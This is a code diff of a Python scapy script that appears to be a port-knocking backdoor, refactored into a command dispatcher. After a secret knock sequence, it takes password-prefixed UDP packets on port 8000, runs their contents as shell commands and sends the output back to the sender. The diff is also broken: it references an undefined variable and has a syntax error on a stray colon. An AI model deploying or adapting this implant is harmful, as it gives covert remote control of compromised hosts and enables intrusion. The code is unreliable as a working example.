@@ -54,22 +54,46 @@ def knock(packet):
             else:
                 print "You suck, state = 0"
 
-def runCommand(packet):
+def shellCommand(packet, command):
+    print "Running command " + command
+    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = password + output.stdout.read() + output.stderr.read()
+    packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=output)
+    send(packet)
+
+def watchAdd():
+    print "watchAdd"
+
+def watchRemove():
+    print "watchRemove"
+
+def exit():
+    print "exit"
+
+def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         data = packet['Raw'].load
         if data.startswith(password):
             data = data[len(password):]
-            print "Running command " + data
-            output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = password + output.stdout.read() + output.stderr.read()
-            packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=output)
-            send(packet)
+            commandType, commandString = data.split(' ', 1)
+            if commandType == 'shell':
+                shellCommand(packet, commandString):
+            elif commandType == 'watchAdd':
+                watchAdd()
+            elif commandType == 'watchRemove':
+                watchRemove()
+            elif commandType == 'exit':
+                exit()
+            else:
+                # terrible
+                print "Unknown command"
 
 def main():
     while state is not 3:
         sniff(filter='udp', prn=knock, count=1)
     print "test"
-    sniff(filter="dst port 8000", prn=runCommand)
+    while True:
+        sniff(filter="dst port 8000", count=1, prn=parseCommand)
 
 if __name__ == '__main__':
     main()
